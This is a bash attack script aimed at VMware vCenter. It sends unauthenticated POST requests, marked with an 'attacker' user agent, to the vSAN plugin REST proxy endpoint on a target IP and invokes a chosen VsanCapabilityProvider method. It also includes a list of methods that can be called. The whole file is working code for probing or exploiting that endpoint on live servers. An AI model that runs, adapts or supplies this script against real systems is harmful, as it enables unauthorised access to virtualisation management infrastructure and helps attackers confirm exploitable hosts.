#!/bin/bash

if [ -z "$1" ]
then
	echo -e "Usage: $0 Target-IP Class/Method(s)\n. To list all class/methods, please use -l option."
	exit
fi

curl -s -k -X $"POST" -H $"Host: $1" -H $'User-Agent: attacker' -H $'Content-Type: application/json' -H $'Connection: close' --data-binary $'{\"methodInput\":[{\"type\":\"ClusterComputeResource\",\"value\": null,\"serverGuid\": null}]}\x0d\x0a' $"https://$1/ui/h5-vsan/rest/proxy/service/com.vmware.vsan.client.services.capability.VsanCapabilityProvider/$2"

LIST(){

	echo -e "getClusterCapabilityData\r
		 getHostCapabilityData\r
		 getHostsCapabilitiyData\r
		 getIsDeduplicationSupported\r
		 getIsEncryptionSupported\r
		 getIsLocalDataProtectionSupportedOnVc\r
		 getIsLocalDataProtectionSupportedOnCluster\r
		 getIsRemoteDataProtectionSupported\r
		 getIsObjectIdentitiesSupportedOnCluster\r
		 getIsHistoricalCapacitySupported\r
		 getIsPerfVerboseModeSupported\r
		 getIsPerfNetworkDiagnosticModeSupported\r
 		 getIsPerfDiagnosticsFeedbackSupportedOnVc\r
		 getIsAdvancedClusterSettingsSupported\r
		 getIsRecreateDiskGroupSupported\r
		 getIsPurgeInaccessibleVmSwapObjectsSupported\r
		 getIsUpdateVumReleaseCatalogOfflineSupported\r
		 getIsVitOnlineResizeSupported\r
		 getIsImprovedCapacityMonitoringSupportedOnVc\r
		 getIsVmLevelCapacityMonitoringSupported\r
		 getIsWhatIfCapacitySupported\r
		 getIsHostReservedCapacitySupported\r
		 getIsUnmountWithMaintenanceModeSupported\r
		 getIsEvacuationStatusSupportedOnCluster\r
...\n
..."

}


while getopts "l" OPT;do
case "$OPT" in
	l) LIST ;;  
esac
done
